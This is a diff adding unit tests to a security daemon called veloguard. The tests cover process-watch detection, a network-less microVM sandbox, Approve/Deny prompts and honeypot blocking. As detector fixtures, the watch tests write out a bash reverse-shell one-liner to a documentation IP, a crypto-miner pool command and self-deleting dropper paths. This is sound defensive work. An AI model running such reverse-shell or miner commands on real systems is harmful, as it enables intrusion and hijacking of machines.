@@ -28,6 +28,7 @@ _TMP = tempfile.mkdtemp(prefix="vg-test-")
 os.environ["VELOGUARD_STATE"] = _TMP
 os.environ["VELOGUARD_AUDIT_LOG"] = os.path.join(_TMP, "audit.log")
 
+os.environ["VELOGUARD_NO_ASK"] = "1"   # never pop an Approve/Deny dialog during tests
 from guardd import (audit, dispatch, executor, honeypot, mcp_server,  # noqa: E402
                     policy, updater, vlayer)
 from guardd.actions import Action, ActionType  # noqa: E402
@@ -972,6 +973,114 @@ class WiredZeroTrust(unittest.TestCase):
                            capture_output=True, text=True, timeout=20,
                            env={"PATH": "/usr/bin:/bin", "VELOGUARD_HOME": str(home)})
         self.assertEqual(r.stdout.strip(), "no-id")
+
+
+class WatchRules(unittest.TestCase):
+    """veloguard watch — which new processes get frozen (high-confidence only)."""
+    H = "/home/u"
+
+    def a(self, exe, cmd="", comm="x", trusted=False):
+        from guardd import watch
+        return watch.assess(exe, cmd, comm, self.H, trusted)
+
+    def test_fileless_and_downloaded_programs_are_flagged(self):
+        self.assertTrue(self.a("/memfd:x (deleted)"))
+        self.assertTrue(self.a("/home/u/Downloads/tool.AppImage"))
+        self.assertTrue(self.a("/tmp/dropper (deleted)"))
+        self.assertIn("deleted its own file", self.a("/dev/shm/x (deleted)")[0])
+
+    def test_trusted_and_installed_and_build_programs_are_not(self):
+        self.assertEqual(self.a("/home/u/Downloads/tool.AppImage", trusted=True), [])
+        self.assertEqual(self.a("/usr/bin/bash", "bash -c ls", "bash"), [])
+        self.assertEqual(self.a("/tmp/go-build123/b001/x.test"), [])
+        self.assertEqual(self.a("/tmp/.mount_Obsid/obsidian"), [])
+
+    def test_miners_and_reverse_shells_by_command_line(self):
+        miner = "./x -o stratum" + "+tcp://pool.example:3333 --donate-level 1"
+        self.assertIn("crypto-miner", self.a("/usr/bin/x", miner, "x")[0])
+        rev = "bash -c 'bash -i >& /dev/" + "tcp/203.0.113.9/4444 0>&1'"
+        self.assertIn("reverse shell", self.a("/usr/bin/bash", rev, "bash")[0])
+        # a tool that merely mentions the pattern is not a reverse shell
+        self.assertEqual(self.a("/usr/bin/grep", "grep -rn /dev/" + "tcp/1.2.3.4/80 .", "grep"), [])
+
+
+class MicroVM(unittest.TestCase):
+    def test_console_is_parsed(self):
+        from guardd import microvm
+        r = microvm.parse_console("boot noise\nVG-BEGIN\nhello\nVG-END exit=3\nVG-NEWFILES\n/tmp/x\n"
+                                  "VG-PROCS\n 1 0 sh sh\nVG-DONE\n")
+        self.assertEqual((r["output"], r["exit"], r["new_files"], r["completed"]),
+                         ("hello", 3, ["/tmp/x"], True))
+
+    def test_the_vm_has_no_network_and_read_only_disks(self):
+        from guardd import microvm
+        c = microvm.vm_config(Path("/k"), Path("/r"), Path("/s"), 30)
+        self.assertEqual(c["network-interfaces"], [])
+        self.assertTrue(all(d["is_read_only"] for d in c["drives"]))
+        self.assertIn("vg.seconds=30", c["boot-source"]["boot_args"])
+
+    def test_not_ready_is_an_answer_not_a_crash(self):
+        from guardd import microvm
+        with mock.patch.object(microvm, "ready", return_value=(False, "no firecracker")):
+            self.assertEqual(microvm.detonate("/bin/true"), {"ok": False, "error": "no firecracker"})
+
+
+class AskThePerson(unittest.TestCase):
+    """Everything the guard restricts goes to the person (Approve/Deny)."""
+
+    def run_check(self, cmd, approved):
+        import contextlib
+        import io
+        from guardd import __main__ as m, approve
+        out = io.StringIO()
+        with mock.patch.object(approve, "ask", return_value=(approved, "test")) as ask, \
+             mock.patch.object(m, "record"), contextlib.redirect_stdout(out):
+            m._check_command(["--json", "--ask", "deny", "--agent", "T", "--", cmd])
+        return json.loads(out.getvalue()), ask
+
+    def test_a_refusal_becomes_a_question(self):
+        v, ask = self.run_check("systemctl stop veloguard-firewall", True)
+        self.assertEqual(v["verdict"], "allow")
+        self.assertEqual(ask.call_args[0][3], "disable")
+        v, _ = self.run_check("systemctl stop veloguard-firewall", False)
+        self.assertEqual(v["verdict"], "deny")
+
+    def test_harmless_commands_ask_nobody(self):
+        v, ask = self.run_check("ls -la", True)
+        self.assertEqual(v["verdict"], "allow")
+        ask.assert_not_called()
+
+    def test_no_desktop_means_deny(self):
+        from guardd import approve
+        self.assertFalse(approve.can_ask())                 # VELOGUARD_NO_ASK in tests
+        self.assertEqual(approve.ask("T", "x", "y")[0], False)
+        self.assertIn("&lt;b&gt;", approve.text_for("<b>", "x", "y", "disable", None))
+
+    def test_the_root_dialog_asks_instead_of_refusing(self):
+        src = (Path(__file__).resolve().parents[1] / "bin" / "veloguard-elevate-root").read_text()
+        self.assertNotIn("refused by the guard", src)
+        self.assertIn("must_ask", src)
+
+
+class HoneypotLan(unittest.TestCase):
+    def test_lan_attackers_blockable_but_never_the_gateway(self):
+        from guardd import __main__ as m
+        with mock.patch.object(m, "_lan_neighbours_to_keep", return_value={"192.168.1.1", "192.168.1.5"}):
+            self.assertTrue(m._lan_blockable("192.168.1.77"))
+            self.assertFalse(m._lan_blockable("192.168.1.1"))
+            self.assertFalse(m._lan_blockable("192.168.1.5"))
+            self.assertFalse(m._lan_blockable("fe80::1"))
+            self.assertFalse(m._lan_blockable("127.0.0.1"))
+
+
+class IncidentHandOff(unittest.TestCase):
+    def test_the_watch_announces_when_it_runs(self):
+        from guardd import incident
+        with mock.patch.object(incident, "responder_alive", return_value=True), \
+             mock.patch.object(incident.os.path, "exists", return_value=True), \
+             mock.patch.object(incident.subprocess, "Popen") as popen:
+            incident.announce({"id": "x", "title": "t"})
+            popen.assert_not_called()
 
 
 if __name__ == "__main__":
